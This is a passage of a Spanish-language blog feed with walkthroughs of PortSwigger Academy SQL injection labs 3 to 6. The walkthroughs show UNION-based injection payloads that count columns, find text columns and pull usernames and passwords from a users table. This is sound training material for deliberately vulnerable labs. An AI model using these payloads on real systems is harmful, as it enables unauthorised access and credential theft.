class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;null&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;--
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;select&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;from&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;tabla&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;where&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;nombre&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;test&amp;#39;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;union&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;select&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;null&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;null&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;null&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;null&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;--
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;reconocimiento&#34;&gt;Reconocimiento&lt;/h2&gt;
&lt;p&gt;Ingresamos a la web y elegimos alguna categoria, en este ejemplo sera la categoria Pets.Ahora es momento de ir probando secuencialmente numero en numero y ver hasta que valor nos dara el error:&lt;/p&gt;
&lt;h3 id=&#34;payloads&#34;&gt;Payloads&lt;/h3&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Payload&lt;/th&gt;
&lt;th&gt;Resultado&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;Pets&#39; order by 1&amp;ndash;&lt;/td&gt;
&lt;td&gt;Imprime resultados normalmente&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Pets&#39; order by 2&amp;ndash;&lt;/td&gt;
&lt;td&gt;Imprime resultados normalmente&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Pets&#39; order by 3&amp;ndash;&lt;/td&gt;
&lt;td&gt;Imprime resultados normalmente&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Pets&#39; order by 4&amp;ndash;&lt;/td&gt;
&lt;td&gt;&lt;strong&gt;Muestra error&lt;/strong&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Pets&#39; UNION SELECT NULL&amp;ndash;&lt;/td&gt;
&lt;td&gt;&lt;strong&gt;Muestra error&lt;/strong&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Pets&#39; UNION SELECT NULL,NULL&amp;ndash;&lt;/td&gt;
&lt;td&gt;&lt;strong&gt;Muestra error&lt;/strong&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Pets&#39; UNION SELECT NULL,NULL,NULL&amp;ndash;&lt;/td&gt;
&lt;td&gt;Imprimer resultados normalmente&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Pets&#39; UNION SELECT NULL,NULL,NULL,NULL&amp;ndash;&lt;/td&gt;
&lt;td&gt;&lt;strong&gt;Muestra error&lt;/strong&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;Como se ve al ingresar el valor 4 o 1,2 y 4 nulls, nos muestra un error de &lt;code&gt;Internal server error&lt;/code&gt; lo que hace que el backend no este respondiendo de manera correcta y no pueda procesar la solicitud. Con esto sabemos que la tabla en la que se extrae los datos cuenta con 3 columnas.&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 147; 
			flex-basis: 354px&#34;
	&gt;
	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-3/resuelto.png&#34; data-size=&#34;1791x1214&#34;&gt;
		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-3/resuelto.png&#34;
			width=&#34;1791&#34;
			height=&#34;1214&#34;
			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-3/resuelto_hudec4bf4e3164bf85cecd215025d78dae_169992_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-3/resuelto_hudec4bf4e3164bf85cecd215025d78dae_169992_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;Laboratorio resuelto&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;Laboratorio resuelto&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;section class=&#34;footnotes&#34; role=&#34;doc-endnotes&#34;&gt;
&lt;hr&gt;
&lt;ol&gt;
&lt;li id=&#34;fn:1&#34; role=&#34;doc-endnote&#34;&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://portswigger.net/web-security/sql-injection/union-attacks/lab-determine-number-of-columns&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;Laboratorio&lt;/a&gt;&amp;#160;&lt;a href=&#34;#fnref:1&#34; class=&#34;footnote-backref&#34; role=&#34;doc-backlink&#34;&gt;&amp;#x21a9;&amp;#xfe0e;&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;/section&gt;
</description>
        </item>
        <item>
        <title>Portswigger Academy Learning Path: SQL Injection Lab 4</title>
        <link>https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-4/</link>
        <pubDate>Thu, 04 Nov 2021 00:00:00 +0000</pubDate>
        
        <guid>https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-4/</guid>
        <description>&lt;img src="https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-4/head.png" alt="Featured image of post Portswigger Academy Learning Path: SQL Injection Lab 4" /&gt;&lt;h1 id=&#34;lab-sql-injection-union-attack-finding-a-column-containing-text&#34;&gt;Lab: SQL injection UNION attack, finding a column containing text&lt;/h1&gt;
&lt;p&gt;En este &lt;!-- raw HTML omitted --&gt;laboratorio&lt;sup id=&#34;fnref:1&#34;&gt;&lt;a href=&#34;#fn:1&#34; class=&#34;footnote-ref&#34; role=&#34;doc-noteref&#34;&gt;1&lt;/a&gt;&lt;/sup&gt;&lt;!-- raw HTML omitted --&gt;la finalidad es saber el tipo de datos que es utilizado en los valores que son enviadas en la consulta, ya que es necesario saber que tipo de valor son para que el sistema no genere errores al momento de extraeros, utilizaremos la informacion anterior primero enumerando el numero de columnas, y al hacer el reconocimiento sabemos que cuenta con 3 columnas ya que es la unica que no genera un error.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span class=&#34;n&#34;&gt;Pets&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39; UNION SELECT NULL,NULL,NULL--
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;reconocimiento&#34;&gt;Reconocimiento&lt;/h2&gt;
&lt;p&gt;Ingresamos a la web y al acceder en mi caso me pide que imprima el valor &lt;code&gt;mO7mSy&lt;/code&gt; al recuperar los datos, asi que buscaremos que valores aceptan string para poder imprimirlo&lt;/p&gt;
&lt;h3 id=&#34;payloads&#34;&gt;Payloads&lt;/h3&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Payload&lt;/th&gt;
&lt;th&gt;Resultado&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;Pets&#39; UNION SELECT &amp;lsquo;test&amp;rsquo;,NULL,NULL&amp;ndash;&lt;/td&gt;
&lt;td&gt;&lt;strong&gt;Muestra error&lt;/strong&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Pets&#39; UNION SELECT NULL,&amp;lsquo;test&amp;rsquo;,NULL&amp;ndash;&lt;/td&gt;
&lt;td&gt;Imprime resultados normalmente&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Pets&#39; UNION SELECT NULL,NULL,&amp;lsquo;test&amp;rsquo;&amp;ndash;&lt;/td&gt;
&lt;td&gt;&lt;strong&gt;Muestra error&lt;/strong&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;Nos podemos dar cuenta que la columna dos permite que se puedan ingresar datos de tipo string ahora toca ingresar la cadena que nos indican para poder resolver el lab, inyectando la consulta sql:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span class=&#34;n&#34;&gt;Pets&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39; UNION SELECT NULL,&amp;#39;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;mO7mSy&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;,NULL--
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 142; 
			flex-basis: 340px&#34;
	&gt;
	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-4/resuelto.png&#34; data-size=&#34;1758x1238&#34;&gt;
		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-4/resuelto.png&#34;
			width=&#34;1758&#34;
			height=&#34;1238&#34;
			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-4/resuelto_huec4219d55952b16f59692c854c1e5e19_171125_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-4/resuelto_huec4219d55952b16f59692c854c1e5e19_171125_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;Laboratorio resuelto&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;Laboratorio resuelto&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;section class=&#34;footnotes&#34; role=&#34;doc-endnotes&#34;&gt;
&lt;hr&gt;
&lt;ol&gt;
&lt;li id=&#34;fn:1&#34; role=&#34;doc-endnote&#34;&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://portswigger.net/web-security/sql-injection/union-attacks/lab-find-column-containing-text&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;Laboratorio&lt;/a&gt;&amp;#160;&lt;a href=&#34;#fnref:1&#34; class=&#34;footnote-backref&#34; role=&#34;doc-backlink&#34;&gt;&amp;#x21a9;&amp;#xfe0e;&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;/section&gt;
</description>
        </item>
        <item>
        <title>Portswigger Academy Learning Path: SQL Injection Lab 5</title>
        <link>https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-5/</link>
        <pubDate>Thu, 04 Nov 2021 00:00:00 +0000</pubDate>
        
        <guid>https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-5/</guid>
        <description>&lt;img src="https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-5/head.png" alt="Featured image of post Portswigger Academy Learning Path: SQL Injection Lab 5" /&gt;&lt;h1 id=&#34;lab-lab-sql-injection-union-attack-retrieving-data-from-other-tables&#34;&gt;Lab: Lab: SQL injection UNION attack, retrieving data from other tables&lt;/h1&gt;
&lt;p&gt;En este &lt;!-- raw HTML omitted --&gt;laboratorio&lt;sup id=&#34;fnref:1&#34;&gt;&lt;a href=&#34;#fn:1&#34; class=&#34;footnote-ref&#34; role=&#34;doc-noteref&#34;&gt;1&lt;/a&gt;&lt;/sup&gt;&lt;!-- raw HTML omitted --&gt;la finalidad es poder extraer los datos de una tabla, las columnas son &lt;code&gt;username&lt;/code&gt; y &lt;code&gt;password&lt;/code&gt; de la tabla &lt;code&gt;users&lt;/code&gt;. La idea es hacer uso del metodo union en sql para poder extraer esos datos aparte de los que ya trae el sistema. La consulta comun para recuperar estos datos seria:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span class=&#34;k&#34;&gt;select&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;username&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;password&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;from&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;users&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;reconocimiento&#34;&gt;Reconocimiento&lt;/h2&gt;
&lt;p&gt;Ahora toca usar el metodo union para poder recuperar esos datos y tratar de inyectar ese comando en la consulta primaria para recuperar los usuarios y contrasenas de la tala de usuarios.&lt;/p&gt;
&lt;h3 id=&#34;payloads&#34;&gt;Payloads&lt;/h3&gt;
&lt;h4 id=&#34;recuperar-columnas&#34;&gt;Recuperar columnas&lt;/h4&gt;
&lt;p&gt;Recuperamos las columnas inyectando la siguiente consulta:&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;https://xxxxxxxxxxxx.web-security-academy.net/filter?category=Pets&#39; order by 4--
&lt;/code&gt;&lt;/pre&gt;&lt;h4 id=&#34;recuperar-tipo-de-datos&#34;&gt;Recuperar tipo de datos&lt;/h4&gt;
&lt;p&gt;Ahora queremos saber que tipos de datos acceptan, inyectando algunas string en los dos vemos que no hay problema al hacerlo.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span class=&#34;n&#34;&gt;Pets&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39; union select &amp;#39;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;test&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;,&amp;#39;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;test&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;--
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 100; 
			flex-basis: 241px&#34;
	&gt;
	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-5/strings.png&#34; data-size=&#34;1781x1773&#34;&gt;
		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-5/strings.png&#34;
			width=&#34;1781&#34;
			height=&#34;1773&#34;
			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-5/strings_hub14488023fc5142b8e0617dac40dcbeb_519418_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-5/strings_hub14488023fc5142b8e0617dac40dcbeb_519418_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;Tipo de Datos aceptados&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;Tipo de Datos aceptados&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;h4 id=&#34;recuperar-datos-de-usuarios&#34;&gt;Recuperar datos de usuarios&lt;/h4&gt;
&lt;p&gt;Ahra ya podemos tomar los datos de la tabla de usuarios que se nos pide, para eso inyectaremos la siguiente consulta:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span class=&#34;n&#34;&gt;Pets&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39; union select username,password from users--
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 100; 
			flex-basis: 240px&#34;
	&gt;
	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-5/extraido.png&#34; data-size=&#34;1744x1742&#34;&gt;
		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-5/extraido.png&#34;
			width=&#34;1744&#34;
			height=&#34;1742&#34;
			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-5/extraido_hu27c916cebc82f9da26fc034f1f8e70b9_529545_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-5/extraido_hu27c916cebc82f9da26fc034f1f8e70b9_529545_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;Usuarios y Contrasenas de la tabla users&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;Usuarios y Contrasenas de la tabla users&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;Ahora que ya nos hicimos con los datos del administrador, podemos iniciar sesion para que el sistema ya nos tome como resuelto el lab.&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 207; 
			flex-basis: 497px&#34;
	&gt;
	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-5/resuelto.png&#34; data-size=&#34;1786x862&#34;&gt;
		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-5/resuelto.png&#34;
			width=&#34;1786&#34;
			height=&#34;862&#34;
			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-5/resuelto_hu8619a3f0e8c32341800ab4c4e3a758b5_98522_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-5/resuelto_hu8619a3f0e8c32341800ab4c4e3a758b5_98522_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;Laboratorio resuelto&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;Laboratorio resuelto&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;section class=&#34;footnotes&#34; role=&#34;doc-endnotes&#34;&gt;
&lt;hr&gt;
&lt;ol&gt;
&lt;li id=&#34;fn:1&#34; role=&#34;doc-endnote&#34;&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-data-from-other-tables&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;Laboratorio&lt;/a&gt;&amp;#160;&lt;a href=&#34;#fnref:1&#34; class=&#34;footnote-backref&#34; role=&#34;doc-backlink&#34;&gt;&amp;#x21a9;&amp;#xfe0e;&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;/section&gt;
</description>
        </item>
        <item>
        <title>Portswigger Academy Learning Path: SQL Injection Lab 6</title>
        <link>https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-6/</link>
        <pubDate>Thu, 04 Nov 2021 00:00:00 +0000</pubDate>
        
        <guid>https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-6/</guid>
        <description>&lt;img src="https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-6/head.png" alt="Featured image of post Portswigger Academy Learning Path: SQL Injection Lab 6" /&gt;&lt;h1 id=&#34;lab-sql-injection-union-attack-retrieving-multiple-values-in-a-single-column&#34;&gt;Lab: SQL injection UNION attack, retrieving multiple values in a single column&lt;/h1&gt;
&lt;p&gt;En este &lt;!-- raw HTML omitted --&gt;laboratorio&lt;sup id=&#34;fnref:1&#34;&gt;&lt;a href=&#34;#fn:1&#34; class=&#34;footnote-ref&#34; role=&#34;doc-noteref&#34;&gt;1&lt;/a&gt;&lt;/sup&gt;&lt;!-- raw HTML omitted --&gt;la finalidad es poder extraer los datos de una tabla, las columnas son &lt;code&gt;username&lt;/code&gt; y &lt;code&gt;password&lt;/code&gt; de la tabla &lt;code&gt;users&lt;/code&gt;. Es igual al anterior lab solamente que esta vez se tiene que extraer los datos en una sola columna haciendo uso de una consulta sql. La forma que tiene SQL para poder extraer datos de esa manera es de la siguiente:&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;DBMS&lt;/th&gt;
&lt;th&gt;Concatenacion&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;Oracle&lt;/td&gt;
&lt;td&gt;&amp;lsquo;foo&amp;rsquo;||&amp;lsquo;bar&amp;rsquo;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Microsoft&lt;/td&gt;
&lt;td&gt;&amp;lsquo;foo&amp;rsquo;+&amp;lsquo;bar&amp;rsquo;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Postgresql&lt;/td&gt;
&lt;td&gt;&amp;lsquo;foo&amp;rsquo;||&amp;lsquo;bar&amp;rsquo;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;MySQL&lt;/td&gt;
&lt;td&gt;&amp;lsquo;foo&amp;rsquo; &amp;lsquo;bar&amp;rsquo;&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h2 id=&#34;reconocimiento&#34;&gt;Reconocimiento&lt;/h2&gt;
&lt;p&gt;Ahora toca usar el metodo union para poder recuperar esos datos y tratar de inyectar ese comando en la consulta primaria para recuperar los usuarios y contrasenas de la tala de usuarios.&lt;/p&gt;
&lt;h3 id=&#34;payloads&#34;&gt;Payloads&lt;/h3&gt;
&lt;p&gt;Estos pasos se repetiran los mismos del laboratorio anterior Lab5.&lt;/p&gt;
&lt;h4 id=&#34;recuperar-columnas&#34;&gt;Recuperar columnas&lt;/h4&gt;
&lt;p&gt;Recuperamos las columnas inyectando la siguiente consulta:&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;https://xxxxxxxxxxxx.web-security-academy.net/filter?category=Pets&#39; order by 1--
https://xxxxxxxxxxxx.web-security-academy.net/filter?category=Pets&#39; order by 2--
https://xxxxxxxxxxxx.web-security-academy.net/filter?category=Pets&#39; order by 3--
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Al ver que en 2 muestra bien y en 3 da un error interno, sabemos que cuenta con 2 columnas.&lt;/p&gt;
&lt;h4 id=&#34;recuperar-tipo-de-datos&#34;&gt;Recuperar tipo de datos&lt;/h4&gt;
&lt;p&gt;Ahora queremos saber que tipos de datos acceptan, inyectando algunas string en los dos vemos que no hay problema al hacerlo.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span class=&#34;n&#34;&gt;Pets&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39; union select &amp;#39;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;test&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;,&amp;#39;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;test&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;--
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;Pets&amp;#39;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;union&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;select&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;test&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;null&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;--
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Pets&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39; union select null,&amp;#39;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;test&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;--
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Ahora sabemos que solo podemos inyectar texto en el una columna que seria la segunda.&lt;/p&gt;
&lt;h4 id=&#34;recuperar-datos-de-usuarios&#34;&gt;Recuperar datos de usuarios&lt;/h4&gt;
&lt;p&gt;Ahra ya podemos tomar los datos de la tabla de usuarios que se nos pide, para eso inyectaremos las siguientes consultas:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span class=&#34;n&#34;&gt;Pets&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39; union select null,username from users--
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;Pets&amp;#39;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;union&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;select&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;null&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;password&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;from&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;users&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;--
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 191; 
			flex-basis: 459px&#34;
	&gt;
	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-6/extraido.png&#34; data-size=&#34;1745x912&#34;&gt;
		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-6/extraido.png&#34;
			width=&#34;1745&#34;
			height=&#34;912&#34;
			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-6/extraido_hu7cf6220e675afdae83dcd87cd1dc56d7_113580_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-6/extraido_hu7cf6220e675afdae83dcd87cd1dc56d7_113580_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;Contrasenas de la tabla users&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;Contrasenas de la tabla users&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;Pero haciendo dos consultas es muy complicado recuperar todos estos datos y luego unirlos y saber que valor es de cada uno. Para eso podemos usar la concatenacion que es propia del sistema, solo es de saber que sistema se esta usando en el backend realizando pruebas, probaremos con todos y ver si nos arroja un resultado. La consultaria quedaria asi:&lt;/p&gt;
